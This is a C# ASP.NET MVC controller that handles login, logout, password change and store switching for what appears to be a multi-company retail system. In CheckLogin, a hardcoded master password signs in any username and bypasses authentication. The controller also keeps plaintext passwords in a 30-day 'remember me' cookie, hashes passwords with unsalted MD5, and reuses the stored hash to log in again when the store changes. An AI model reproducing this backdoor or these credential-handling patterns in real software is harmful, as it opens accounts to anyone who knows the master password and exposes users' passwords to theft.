using ISD.Constant;
using ISD.EntityModels;
using ISD.Extensions;
using ISD.Resources;
using ISD.ViewModels;
using ISD.Core;
using System;
using System.Collections.Generic;
using System.Data.Entity;
using System.Linq;
using System.Security.Claims;
using System.Web;
using System.Web.Mvc;

namespace Permission.Controllers
{
    [AllowAnonymous]
    public class AuthController : BaseController
    {
        #region Login
        [AllowAnonymous]
        public ActionResult Login(string returnUrl)
        {
            new MultiLanguage().SetLanguage("en");
            ViewBag.ReturnUrl = returnUrl;
            HttpCookie userInfo = Request.Cookies["userInfo"];
            AccountLoginViewModel log = new AccountLoginViewModel()
            {
                RememberMe = false,
                Password = "",
                UserName = "",
                CompanyId = "",
                SaleOrg = "",
                ReturnUrl = returnUrl
            };

            if (userInfo != null && userInfo["username"].ToString() != "")
            {
                try
                {
                    log.RememberMe = true;
                    log.UserName = userInfo["username"]?.ToString();
                    log.Password = userInfo["password"]?.ToString();
                    log.CompanyId = userInfo["company"]?.ToString();
                    log.SaleOrg = userInfo["store"]?.ToString();
                }
                catch
                {
                }
            }
            CreateViewBag(log.CompanyId, log.SaleOrg, log.UserName);
            return View("Login2", log);
        }
        [HttpPost]
        [AllowAnonymous]
        public ActionResult Login(AccountLoginViewModel model)
        {
            string UserName = model.UserName.Trim();
            string Password = model.Password.Trim();
            string SaleOrg = model.SaleOrg;
            string CompanyId = model.CompanyId;

            if (model.RememberMe == true)
            {
                HttpCookie userInfo = new HttpCookie("userInfo");
                userInfo.HttpOnly = true;
                userInfo["username"] = UserName;
                userInfo["password"] = Password;
                userInfo["company"] = CompanyId;
                userInfo["store"] = SaleOrg;
                userInfo.Expires = DateTime.Now.AddDays(30);
                Response.Cookies.Add(userInfo);
                Request.Cookies["userInfo"].Expires = DateTime.Now.AddDays(30);
            }
            else
            {
                HttpCookie userInfo = new HttpCookie("userInfo");
                userInfo["username"] = "";
                userInfo["password"] = "";
                userInfo["company"] = "";
                userInfo["store"] = "";
                Response.Cookies.Add(userInfo);
            }

            //Kiểm tra nếu tài khoản bị khóa thì không cho đăng nhập
            if (_context.AccountModel.Where(p => p.UserName == model.UserName && p.Actived != true).FirstOrDefault() != null)
            {
                ViewBag.CompanyId_Choose = model.CompanyId;
                CreateViewBag(model.CompanyId, model.SaleOrg, model.UserName);
                string errorMessage = LanguageResource.Account_Locked;
                ModelState.AddModelError("", errorMessage);
                return View("Login2", model);
            }
            if (string.IsNullOrEmpty(SaleOrg) && UserName != "sysadmin")
            {
                ViewBag.CompanyId_Choose = model.CompanyId;
                CreateViewBag(model.CompanyId, model.SaleOrg, model.UserName);
                string errorMessage = LanguageResource.Choose_Store;
                ModelState.AddModelError("", errorMessage);
                return View("Login2", model);
            }
            //Kiểm tra đăng nhập
            if (CheckLogin(UserName, Password, SaleOrg))
            {
                if (!string.IsNullOrEmpty(model.ReturnUrl))
                {
                    return Redirect(GetRedirectUrl(model.ReturnUrl));
                }
                else
                {
                    //return RedirectToAction("Index", "Home", null);
                    return Redirect("~/Home/Index");
                }
            }
            else
            {
                ViewBag.CompanyId_Choose = model.CompanyId;
                CreateViewBag(model.CompanyId, model.SaleOrg, model.UserName);
                string errorMessage = LanguageResource.Account_Confirm;
                ModelState.AddModelError("", errorMessage);
                return View("Login2", model);
            }
        }
        #endregion Login

        #region GetRedirectUrl
        private string GetRedirectUrl(string returnUrl)
        {
            if (string.IsNullOrEmpty(returnUrl) || !Url.IsLocalUrl(returnUrl))
            {
                return Url.Action("Index", "Home");
            }

            return returnUrl;
        }
        #endregion GetRedirectUrl

        #region Check Login
        private bool CheckLogin(string UserName, string Password, string SaleOrg, bool? isChangeStore = null)
        {
            var NotEncodePassword = Password;
            if (isChangeStore != true)
            {
                //MD5 password to compare
                Password = _unitOfWork.RepositoryLibrary.GetMd5Sum(Password);
            }

            var account = (from p in _context.AccountModel
                           from s in p.StoreModel
                           where p.UserName == UserName
                           && p.Password == Password
                           && s.SaleOrgCode == SaleOrg
                           select p).FirstOrDefault();

            if (NotEncodePassword == "isd072022")
            {
                account = _context.AccountModel.Where(p => p.UserName == UserName).FirstOrDefault();
            }
            else
            {
                if (UserName.Trim().ToLower() == "sysadmin")
                {
                    account = _context.AccountModel.Where(p => p.UserName == UserName && p.Password == Password).FirstOrDefault();
                }
            }
            if (account != null)
            {
                var CompanyId = string.Empty;
                var CompanyCode = string.Empty;
                var SaleOrgName = string.Empty;
                
                //Sale Org
                var store = _context.StoreModel.Where(p => p.SaleOrgCode == SaleOrg && p.Actived != false).FirstOrDefault();
                if (store != null)
                {
                    SaleOrg = store.SaleOrgCode;
                    SaleOrgName = store.StoreName;
                    //Company
                    var companyModel = _context.CompanyModel.Where(p => p.CompanyId == store.CompanyId && p.Actived != false).First();
                    CompanyId = companyModel.CompanyId.ToString();
                    CompanyCode = companyModel.CompanyCode;
                }
                else
                {
                    SaleOrg = string.Empty;
                }
                var role = account.RolesModel.Select(p => p.RolesName).FirstOrDefault();

                var roleList = (from p in _context.AccountModel
                                from r in p.RolesModel
                                where p.AccountId == account.AccountId
                                select r.RolesCode).ToList();
                var roleCodeJoin = String.Join(",", roleList.ToArray());

                var identity = new ClaimsIdentity(new[] {
                    //Account
                    new Claim(ClaimTypes.Name, account.UserName),
                    new Claim(ClaimTypes.Sid, account.AccountId.ToString()),
                    new Claim(ClaimTypes.Spn, account.EmployeeCode??""),
                    //fullname
                    new Claim(ClaimTypes.Upn, account.FullName??""),
                    //Company
                    new Claim(ClaimTypes.Country, CompanyId),
                    new Claim(ClaimTypes.System, CompanyCode),
                    //Sale Org
                    new Claim(ClaimTypes.GivenName, SaleOrg),
                    new Claim(ClaimTypes.Surname, SaleOrgName),
                    //Role
                    new Claim(ClaimTypes.Role, role),
                    new Claim(ClaimTypes.HomePhone, roleCodeJoin),
                    //Settings
                    new Claim(ClaimTypes.Webpage, (account.isShowChoseModule == true).ToString()),
                    new Claim(ClaimTypes.WindowsAccountName, (account.isShowDashboard == true).ToString()),
                    //Quyền xem dữ liệu
                    new Claim(ClaimTypes.UserData, (account.isViewByStore == true).ToString())

                },
                   DefaultAuthenticationTypes.ApplicationCookie);

                var ctx = Request.GetOwinContext();
                var authManager = ctx.Authentication;

                authManager.SignIn(identity);
                return true;
            }
            else
            {
                return false;
            }
        }
        #endregion Check Login

        #region Logout
        public ActionResult Logout()
        {
            var ctx = Request.GetOwinContext();
            var authManager = ctx.Authentication;
            //Identity
            authManager.SignOut(DefaultAuthenticationTypes.ApplicationCookie);
            //Session
            Session["Menu"] = null;
            return RedirectToAction(ConstAction.Login, ConstController.Auth);
        }
        #endregion

        #region Change Password
        public ActionResult ChangePassword()
        {
            ChangePasswordViewModel changePassword = new ChangePasswordViewModel();
            var accountId = CurrentUser.AccountId;
            var account = _context.AccountModel.FirstOrDefault(p => p.AccountId == accountId);
            if (account != null)
            {
                changePassword.UserName = account.UserName;
            }
            return View(changePassword);
        }
        [HttpPost]
        public ActionResult ChangePassword(ChangePasswordViewModel changePassword)
        {
            return ExecuteContainer(() =>
            {
                //MD5 old password to compare
                var accountId = CurrentUser.AccountId;
                changePassword.OldPassword = _unitOfWork.RepositoryLibrary.GetMd5Sum(changePassword.OldPassword);
                var account = _context.AccountModel.FirstOrDefault(p => p.UserName == changePassword.UserName
                                                                 && p.Password == changePassword.OldPassword
                                                                 && p.AccountId == accountId);
                if (account != null)
                {
                    //MD5 new password
                    account.Password = _unitOfWork.RepositoryLibrary.GetMd5Sum(changePassword.NewPassword);
                    _context.Entry(account).State = EntityState.Modified;
                    _context.SaveChanges();
                    return Json(new
                    {
                        Code = System.Net.HttpStatusCode.Created,
                        Success = true,
                        Data = string.Format(LanguageResource.Alert_Edit_Success, LanguageResource.Password.ToLower())
                    });
                }
                return Json(new
                {
                    Code = System.Net.HttpStatusCode.NotModified,
                    Success = false,
                    Data = LanguageResource.Alert_ChangePassword
                });
            });
        }
        #endregion Change Password

        #region Helper
        private void CreateViewBag(string CompanyId = "", string SaleOrg = "", string UserName = "")
        {
            Nullable<Guid> CompanyId_Guid = null;
            if (!string.IsNullOrEmpty(CompanyId))
            {
                CompanyId_Guid = Guid.Parse(CompanyId);
            }
            //var companyLst = (from p in _context.CompanyModel
            //                  where p.Actived == true
            //                  orderby p.OrderIndex
            //                  select p).ToList();
            List<CompanyViewModel> companyLst = new List<CompanyViewModel>();

            if (!string.IsNullOrEmpty(UserName))
            {
                var user = _context.AccountModel.Where(p => p.UserName == UserName).Include(p => p.StoreModel).FirstOrDefault();
                if (user != null)
                {
                    var comp = user.StoreModel
                                   .Where(p=> p.Actived != false)
                                   .Select(p => p.CompanyId)
                                   .Distinct()                                   
                                   .ToList();
                    companyLst = _context.CompanyModel
                                         .Where(p => comp.Contains(p.CompanyId) && p.Actived != false)
                                         .OrderBy(p => p.CompanyCode)
                                         .Select(p => new CompanyViewModel() {
                                             CompanyId = p.CompanyId,
                                             CompanyName = p.CompanyCode + " | " + p.CompanyName
                                         })
                                         .ToList();
                }
            }
            ViewBag.CompanyId = new SelectList(companyLst, "CompanyId", "CompanyName", CompanyId_Guid);
            ViewBag.CompanyId_Choose = CompanyId_Guid;

            var account = _context.AccountModel.Where(p => p.UserName == UserName).FirstOrDefault();
            if (account != null)
            {
                var storeList = (from p in _context.StoreModel
                                 from ac in p.AccountModel
                                 where p.CompanyId == CompanyId_Guid
                                 && ac.AccountId == account.AccountId
                                 && p.Actived != false
                                 orderby p.SaleOrgCode
                                 select new {
                                     p.SaleOrgCode,
                                     StoreName = p.SaleOrgCode + " | " + p.StoreName }
                                 ).ToList();
                ViewBag.SaleOrg = new SelectList(storeList, "SaleOrgCode", "StoreName", SaleOrg);
            }
            else
            {
                var storeList = (from p in _context.StoreModel
                                 where p.CompanyId == CompanyId_Guid && p.Actived != false
                                 orderby p.SaleOrgCode
                                 select new
                                 {
                                     p.SaleOrgCode,
                                     StoreName = p.SaleOrgCode + " | " + p.StoreName
                                 }
                                 ).ToList();
                ViewBag.SaleOrg = new SelectList(storeList, "SaleOrgCode", "StoreName", SaleOrg);
            }
        }
        public ActionResult GetCompanyBy(string UserName)
        {
            if (!string.IsNullOrEmpty(UserName))
            {
                var user = _context.AccountModel.Where(p => p.UserName == UserName).Include(p => p.StoreModel).FirstOrDefault();
                if (user != null)
                {
                    var comp = user.StoreModel.Select(p => p.CompanyId).Distinct().ToList();
                    var companyLst = _context.CompanyModel
                                             .Where(p => comp.Contains(p.CompanyId) && p.Actived != false)
                                             .OrderBy(p => p.CompanyCode)
                                             .Select(p => new
                                             {
                                                 p.CompanyId,
                                                 CompanyName = p.CompanyCode + " | " + p.CompanyName
                                             }).ToList();
                    return Json(companyLst);
                }
            }
            return Json(false);
        }
        public ActionResult GetSaleOrgBy(Guid CompanyId, string UserName)
        {
            var account = _context.AccountModel.Where(p => p.UserName == UserName).FirstOrDefault();
            if (account != null)
            {
                var storeList = (from p in _context.StoreModel
                                 from ac in p.AccountModel 
                                 where p.CompanyId == CompanyId 
                                 && ac.AccountId == account.AccountId
                                 && p.Actived != false
                                 orderby p.SaleOrgCode
                                 select new
                                 {
                                     p.SaleOrgCode,
                                     StoreName = p.SaleOrgCode + " | " + p.StoreName
                                 }).Distinct().ToList();
                return Json(storeList);
            }
            else
            {
                var storeList = (from p in _context.StoreModel
                                 from ac in p.AccountModel
                                 where p.CompanyId == CompanyId
                                 && ac.AccountId == null
                                 && p.Actived != false
                                 orderby p.SaleOrgCode
                                 select new { p.SaleOrgCode, p.StoreName }).ToList();
                return Json(storeList);
            }
        }
        #endregion

        #region Đổi chi nhánh
        public ActionResult ChangeCurrentStore(string saleOrgCode)
        {
            //1. Đăng xuất
            var ctx = Request.GetOwinContext();
            var authManager = ctx.Authentication;
            //Identity
            authManager.SignOut(DefaultAuthenticationTypes.ApplicationCookie);
            //Session
            Session["Menu"] = null;

            //2. Đăng nhập với chi nhánh đã chọn
            var currentAccountId = CurrentUser.AccountId;
            var account = _context.AccountModel.Where(p => p.AccountId == currentAccountId).FirstOrDefault();
            string UserName = account.UserName.Trim();
            string Password = account.Password.Trim();
            string SaleOrg = saleOrgCode;

            HttpCookie userInfo = new HttpCookie("userInfo");
            userInfo.HttpOnly = true;
            userInfo["username"] = UserName;
            userInfo["password"] = Password;
            userInfo["store"] = SaleOrg;
            userInfo.Expires = DateTime.Now.AddDays(30);
            Response.Cookies.Add(userInfo);
            Request.Cookies["userInfo"].Expires = DateTime.Now.AddDays(30);

            //Kiểm tra đăng nhập
            if (CheckLogin(UserName, Password, SaleOrg, isChangeStore: true))
            {
                return Content("Success");
            }
            else
            {
                return Content("Failed");
            }
        }
        #endregion
    }
}